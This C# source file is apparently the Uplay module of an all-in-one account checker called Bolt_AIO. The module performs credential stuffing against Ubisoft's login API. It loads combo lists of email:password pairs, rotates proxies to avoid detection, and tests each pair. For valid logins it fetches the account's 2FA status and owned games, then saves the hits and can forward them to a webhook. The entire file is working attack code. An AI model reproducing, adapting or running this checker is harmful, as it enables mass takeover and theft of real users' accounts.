using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class Uplaymod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.AddHeader("Authorization", "Basic " + Base64Encode(array[0] + ":" + array[1]));
                            req.AddHeader("Ubi-AppId", "f68a4bb5-608a-4ff2-8123-be8ef797e0a6");
                            req.AddHeader("Ubi-RequestedPlatformType", "uplay");
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://public-ubiservices.ubi.com/v3/profiles/sessions", "{}",
                                "application/json; charset=utf-8").ToString();
                            var flag7 = text2.Contains("profileId");

                            if (flag7)
                            {
                                var jsonObj = (JObject) JsonConvert.DeserializeObject(text2);

                                var sessionId = jsonObj["sessionId"].ToString();
                                var ticket = jsonObj["ticket"].ToString();

                                var has2fa = UPlayHas2FA(ticket, sessionId);

                                var games = UPlayGetGames(ticket);

                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Uplay_hits",
                                    array[0] + ":" + array[1] + $" | HAS 2FA: {has2fa} - GAMES: {games}");
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Uplay",
                                        array[0] + ":" + array[1] + $" | HAS 2FA: {has2fa} - GAMES: {games}");
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(
                                        array[0] + ":" + array[1] + $" | HAS 2FA: {has2fa} - GAMES: {games}",
                                        "Uplay Hits");
                            }
                            else
                            {
                                var flag8 = text2.Contains("Invalid credentials");
                                if (flag8)
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (text2.Contains("The Ubi-Challenge header is required."))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string UPlayHas2FA(string ticket, string sessionId)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.AddHeader("Ubi-SessionId", sessionId);
                        req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        req.Authorization = "Ubi_v1 t=" + ticket;

                        var strResponse = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa"))
                            .ToString();
                        if (strResponse.Contains("active"))
                        {
                            if (strResponse.Contains("true"))
                                return "true";
                            if (strResponse.Contains("false")) return "false";
                        }
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "?";
        }

        private static string UPlayGetGames(string ticket)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        req.Authorization = "Ubi_v1 t=" + ticket;

                        var strResponse =
                            req.Get(new Uri(
                                    "https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned"))
                                .ToString();
                        if (strResponse.Contains("[") && strResponse != "[]")
                        {
                            var games = Regex.Match(strResponse, "\"slug\":\"(.*?)\"");
                            var platforms = Regex.Match(strResponse, "\"platform\":\"(.*?)\"");

                            var result = "";

                            while (true)
                            {
                                result += "[" + games.Groups[1].Value + " - " + platforms.Groups[1].Value + "]";

                                games = games.NextMatch();
                                platforms = platforms.NextMatch();

                                if (games.Groups[1].Value == "")
                                    break;
                                result += ", ";
                            }

                            return result;
                        }
                    }
                }
                catch
                {
                    //AtomicAIO.modulesProgram.errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}